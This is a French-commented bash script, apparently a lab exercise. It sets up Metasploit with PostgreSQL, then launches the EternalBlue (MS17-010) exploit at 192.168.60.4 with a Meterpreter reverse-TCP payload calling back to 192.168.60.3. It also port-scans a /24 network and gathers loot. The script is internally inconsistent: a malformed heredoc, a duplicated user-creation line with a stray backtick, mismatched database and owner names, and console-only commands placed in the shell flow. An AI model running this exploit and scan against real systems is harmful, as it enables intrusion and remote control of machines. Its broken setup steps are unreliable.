#!/bin/bash

# Partie 1 : Installation de Metasploit avec PostgreSQL

# Commandes et explications

sudo apt update
# Met à jour la liste des paquets disponibles depuis les dépôts APT.
# Toujours faire avant une installation pour avoir les dernières versions

sudo apt install -y postgresql postgresql-contrib metasploit-framework
# Installe PostgreSQL (serveur de base de données)
# Installe postgresql-contrib` (outils complémentaires), ainsi que `metasploit-framework
# -y : répond « oui » automatiquement à toutes les questions d'installation.
# Pourquoi : Metasploit utilise PostgreSQL pour stocker :hôtes scannés+les résultats+les sessions+etc

sudo systemctl enable --now postgresql
# Active le service PostgreSQL pour qu’il démarre automatiquement et le lance immédiatement (`--now`).
# Vérification (optionnelle) : `sudo systemctl status postgresql` pour voir l'état du service.

sudo -u postgres createuser --superuser msf
sudo -u postgres createdb -O msf msf_database
#créent un utilisateur PostgreSQL et une base de données

sudo -u postgres createuser --superuser msf`
# Crée un utilisateur PostgreSQL nommé `msf`.
# --superuser` donne les privilèges de superutilisateur

sudo -u postgres createdb -O benbet baseholberton
# Crée une base de données nommée baseholberton
# -O benbet définit benbet comme propriétaire de cette base (permissions).

msfdb init
# Initialize Metasploit database

db_status
# indique à quelle base de données est connecté metasploit

sudo -u postgres psql
# pour se connecter à postgres

\l
# sous postgres=# donne la liste des BdD et les utilisateurs/propriétaires

\du
# donne les privilèges des utilisateurs


# Part 2: Basic Usage

#lance metasploit mode silencieux et execute les commandes contenues entre EOF et ferme
msfconsole -q <'EOF'

# Affiche la version de Metasploit
version

# Recherche les exploits liés à MS17-010 (EternalBlue)
search ms17_010

# Charge le module d'exploitation EternalBlue pour SMB Windows
use exploit/windows/smb/ms17_010_eternalblue

# Définit l'adresse IP de la cible
set RHOSTS 192.168.60.4

# Définit l'adresse IP locale pour le reverse TCP
set LHOST 192.168.60.3

# Définit le port d'écoute pour la session reverse
set LPORT 4444

# Sélectionne la payload Meterpreter 64 bits en reverse TCP
set PAYLOAD windows/x64/meterpreter/reverse_tcp

# Lance l'exploit en arrière-plan (-z)
run -z

# Ajoute une note dans Metasploit pour documenter l'action
notes add -t host -n "EternalBlue exploit launched against 192.168.60.4"

# Liste les loot/fichiers collectés par l'exploit, format CSV
loot -t csv

# Quitte Metasploit sans demander confirmation
exit -y
EOF

# ---------- Part 3: Payload Creation ----------
# (payload.elf already generated with msfvenom)

# ---------- Part 4: Auxiliary Module ----------
msfconsole -q <<'EOF'
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.1.0/24
set THREADS 50
run
notes add -t host -n "TCP port scan completed for 192.168.1.0/24"
loot -t csv
exit -y
EOF

# ---------- Part 5: Report Generation ----------
echo "All tasks completed. Notes and loot CSV available in ~/.msf4/loot/"

